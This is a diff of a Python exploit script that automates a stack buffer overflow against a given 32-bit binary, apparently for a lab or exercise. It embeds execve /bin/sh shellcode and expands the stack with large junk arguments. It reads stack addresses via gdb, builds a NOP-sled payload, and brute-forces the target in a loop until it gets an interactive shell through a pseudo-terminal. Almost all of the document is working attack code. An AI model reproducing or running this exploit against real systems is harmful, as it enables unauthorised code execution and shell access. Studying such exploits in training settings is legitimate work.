@@ -67,30 +67,20 @@ def locate_ra(pattern):
     return offset
 
 
+def target_ra(vuln):
 
+    #find in what adresses the stack fluctuates -> info proc mapping
 
-def main():
-        
-    if len(sys.argv) != 2:
-        print("No executable file provided")
-        sys.exit(1)
-
-    vuln = sys.argv[1]
-    # docker_image = sys.argv[2]
-
-    #this program has PIE enabled -> compilation option that changes the location of the executable in every run. PIE does not work locally
     #first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
     trash = b'B'*131000
     trash_args = "`cat trash` " * 15    
-    open("trash", "wb").write(trash)
-    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+    open("trash", "wb").write(trash)  
 
-    #then call gdb to find in what adresses the stack fluctuates -> info proc mapping
-    gdb_process = subprocess.Popen("gdb vuln", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
+    gdb_process = subprocess.Popen(f"gdb {vuln}", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
     commands = f"""
     set disable-randomization off
     set breakpoint pending on
-    b vuln
+    b main
     r {trash_args}
     info proc mapping
     q
@@ -101,92 +91,100 @@ def main():
     gdb_process.stdin.flush()
     output, _ = gdb_process.communicate()
 
-    middle = stack_middle_address(output)
+    return output
 
-    #find where the buffer overflows
-    #must change the test generator
-    overflow = b'A'
+def construct_payload(offset, vuln):
+
+    middle = stack_middle_address(target_ra(vuln))
+    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+
+    #!!! will change
+    offset += 4 
+    #!!!
+
+    payload = b'A' * offset
+    payload += struct.pack("<I", middle)
+    payload += b'\x90' * 200000
+    payload += shellcode
+
+    open("vuln_payload", "wb").write(payload)
+
+def main():
+        
+    if len(sys.argv) != 2:
+        print("No executable file provided")
+        sys.exit(1)
+
+    vuln = sys.argv[1]
+
+    #this program has PIE enabled -> compilation option that changes the location of the executable in every run. PIE does not work locally
+
+
+    ra_offset = locate_ra(generate_test())
+    print(f"ra offset: {ra_offset}")
+    construct_payload(ra_offset, vuln)
+
+    #performing brute force attack
+    exploit_command = f"cat vuln_payload - | ./{vuln} `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`"
+    i = 0
     while True:
-        vuln_proc = subprocess.Popen([f"./{vuln}"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        vuln_proc.communicate(overflow)
+        # print(f"i: {i}")
+        i += 1
 
-        if vuln_proc.returncode == -11:
-            # print(f"Segmentation fault occurred with buffer length: {len(overflow)}")
-            #not sure why the program crashes at 136 bytes length, will add 4 bytes to the buffer to cover ebp and reach the return address location. Must change!
-            overflow += b'A'*4
+        master_fd, slave_fd = pty.openpty()
 
-            #constructing the payload
-            payload = overflow
-            payload += struct.pack("<I", middle)
-            payload += b'\x90' * 200000
-            payload += shellcode
+        exploit_proc = subprocess.Popen(exploit_command, shell=True, stderr=slave_fd, stdin=slave_fd, stdout=slave_fd, close_fds=True)
+        os.write(master_fd, b'\n')
 
-            open("vuln_payload", "wb").write(payload)
+        while True:
+                rlist, _, _ = select.select([master_fd, 0], [], [])
+                # status = exploit_proc.poll()        #why is the status still None after segmentation fault??
+                # print(f"process status: {status}")
 
-            #performing brute force attack
-            #while true; do cat vuln_payload - | ./vuln `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`; done
-            exploit_command = "cat vuln_payload - | ./vuln `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`"
-            i = 0
-            while True:
-                # print(f"i: {i}")
-                i += 1
-
-                master_fd, slave_fd = pty.openpty()
-
-                exploit_proc = subprocess.Popen(exploit_command, shell=True, stderr=slave_fd, stdin=slave_fd, stdout=slave_fd, close_fds=True)
-                os.write(master_fd, b'\n')
-
-                while True:
-                        rlist, _, _ = select.select([master_fd, 0], [], [])
-                        # status = exploit_proc.poll()        #why is the status still None after segmentation fault??
-                        # print(f"process status: {status}")
-
-                        if master_fd in rlist:
-                            try:
-                                output = os.read(master_fd, 100000)
-                                if output:
-                                    # os.write(1, output)  # Write the process output to stdout (1)
-                                    if b'Segmentation fault' in output:           #must change, must retrieve the exit code of the process (139)
-                                        exploit_proc.terminate()
-                                        break
-
-                                else:
-                                    break  # Process has exited
-                            except OSError:
+                if master_fd in rlist:
+                    try:
+                        output = os.read(master_fd, 100000)
+                        if output:
+                            # os.write(1, output)  # Write the process output to stdout (1)
+                            if b'Segmentation fault' in output:           #must change, must retrieve the exit code of the process (139)
+                                exploit_proc.terminate()
                                 break
 
-                        if 0 in rlist:
-                            #exploit took place successfully
-                            while True:
-                                os.write(1, b'# ')
-                                user_input = os.read(0, 5000)
-                                
-                                if b'exit' in user_input:
-                                        exploit_proc.terminate()
-                                        os.close(master_fd)
-                                        os.close(slave_fd)
-                                        os.remove("trash")
-                                        os.remove("vuln_payload")
-                                        sys.exit(1)
-                                
-                                os.write(master_fd, user_input)  # Forward user input to the exploit shell
-                                rlist_response, _, _ = select.select([master_fd], [], [])
+                        else:
+                            break  # Process has exited
+                    except OSError:
+                        break
 
-                                while master_fd in rlist_response:
-                                    response = os.read(master_fd, 1024)
-                                    response = response.replace(b'\r', b'')
-                                    if response != user_input:
-                                        os.write(1, response)
-                                        break
+                if 0 in rlist:
+                    #exploit took place successfully
+                    while True:
+                        os.write(1, b'# ')
+                        user_input = os.read(0, 5000)
+                        
+                        if b'exit' in user_input:
+                                exploit_proc.terminate()
+                                os.close(master_fd)
+                                os.close(slave_fd)
+                                os.remove("trash")
+                                os.remove("vuln_payload")
+                                sys.exit(1)
+                        
+                        os.write(master_fd, user_input)  # Forward user input to the exploit shell
+                        rlist_response, _, _ = select.select([master_fd], [], [])
 
-                                    rlist_response, _, _ = select.select([master_fd], [], [])
+                        while master_fd in rlist_response:
+                            response = os.read(master_fd, 1024)
+                            response = response.replace(b'\r', b'')
+                            if response != user_input:
+                                os.write(1, response)
+                                break
 
-                # Close the PTY file descriptors
-                os.close(master_fd)
-                os.close(slave_fd)
+                            rlist_response, _, _ = select.select([master_fd], [], [])
+
+        # Close the PTY file descriptors
+        os.close(master_fd)
+        os.close(slave_fd)
             
-        else:
-            overflow += b'A'
 
 
 if __name__ == "__main__":
